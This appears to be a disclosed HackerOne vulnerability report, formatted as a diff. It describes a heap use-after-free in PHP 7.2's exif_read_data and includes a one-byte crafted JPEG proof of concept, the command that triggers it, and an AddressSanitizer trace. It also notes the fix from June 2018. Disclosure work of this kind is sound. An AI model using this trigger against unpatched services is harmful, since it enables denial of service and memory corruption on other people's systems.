@@ -1,0 +1,60 @@
+ReportLink:https://hackerone.com/reports/371135
+WeaknessName:Use After Free
+Reporter:https://hackerone.com/geeknik
+ReportedTo:PHP (IBB)(ibb-php)
+BountyAmount:500.0
+Severity:medium
+State:Closed
+DateOfDisclosure:01.09.2018 19:06:44
+
+Summary:
+
+`exif_read_data` in PHP 7.2 through 7.2.6 (and possibly 7.2.7) is vulnerable to a heap use after free when fed a specially crafted JPEG. Any online service that uses PHP 7.2 and reads EXIF data from uploaded JPEGs is potentially vulnerable to this flaw.
+
+```
+USE_ZEND_ALLOC=0 ./php-e147eb2 -r 'exif_read_data(file_get_contents("/full/path/to/test.jpg"));'
+
+echo "Lw==" | base64 -d > test.jpg
+
+od -tx1 test.jpg
+0000000 2f
+0000001
+```
+
+```
+==15865==ERROR: AddressSanitizer: heap-use-after-free on address 0x611000000ad0 at pc 0x0000013d8100 bp 0x7fff9778bda0 sp 0x7fff9778bd98
+READ of size 8 at 0x611000000ad0 thread T0
+    #0 0x13d80ff in _php_stream_free /root/php-7.2.6/main/streams/streams.c:373:13
+    #1 0xe4a08f in exif_read_from_file /root/php-7.2.6/ext/exif/exif.c:4411:2
+    #2 0xe4a08f in zif_exif_read_data /root/php-7.2.6/ext/exif/exif.c:4482
+    #3 0x18692f5 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /root/php-7.2.6/Zend/zend_vm_execute.h:573:2
+    #4 0x1683367 in execute_ex /root/php-7.2.6/Zend/zend_vm_execute.h:59723:7
+    #5 0x1683aa5 in zend_execute /root/php-7.2.6/Zend/zend_vm_execute.h:63760:2
+    #6 0x14fdb5c in zend_eval_stringl /root/php-7.2.6/Zend/zend_execute_API.c:1082:4
+    #7 0x14fe3a7 in zend_eval_stringl_ex /root/php-7.2.6/Zend/zend_execute_API.c:1123:11
+    #8 0x14fe3a7 in zend_eval_string_ex /root/php-7.2.6/Zend/zend_execute_API.c:1134
+    #9 0x196fd32 in do_cli /root/php-7.2.6/sapi/cli/php_cli.c:1042:8
+    #10 0x196dd4f in main /root/php-7.2.6/sapi/cli/php_cli.c:1404:18
+    #11 0x7fb432b3382f in __libc_start_main /build/glibc-Cl5G7W/glibc-2.23/csu/../csu/libc-start.c:291
+    #12 0x43bd68 in _start (/root/php-7.2.6/sapi/cli/php+0x43bd68)
+
+0x611000000ad0 is located 144 bytes inside of 224-byte region [0x611000000a40,0x611000000b20)
+freed by thread T0 here:
+    #0 0x4e2c32 in free /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cc:78:3
+    #1 0x13d7f53 in _php_stream_free /root/php-7.2.6/main/streams/streams.c:511:3
+
+previously allocated by thread T0 here:
+    #0 0x4e2f73 in __interceptor_malloc /b/build/slave/linux_upload_clang/build/src/third_party/llvm/compiler-rt/lib/asan/asan_malloc_linux.cc:98:3
+    #1 0x147855a in __zend_malloc /root/php-7.2.6/Zend/zend_alloc.c:2829:14
+    #2 0x13ed4b3 in _php_stream_fopen_from_fd_int /root/php-7.2.6/main/streams/plain_wrapper.c:186:9
+    #3 0x13ed4b3 in _php_stream_fopen_from_fd /root/php-7.2.6/main/streams/plain_wrapper.c:248
+
+SUMMARY: AddressSanitizer: heap-use-after-free /root/php-7.2.6/main/streams/streams.c:373:13 in _php_stream_free
+```
+
+
+This was reported to the PHP team on [3 June 2018](https://bugs.php.net/bug.php?id=76409) and marked fixed on [9 June 2018](https://bugs.php.net/bug.php?id=76409).
+
+## Impact
+
+Denial of service, memory corruption, information disclosure, remote code execution
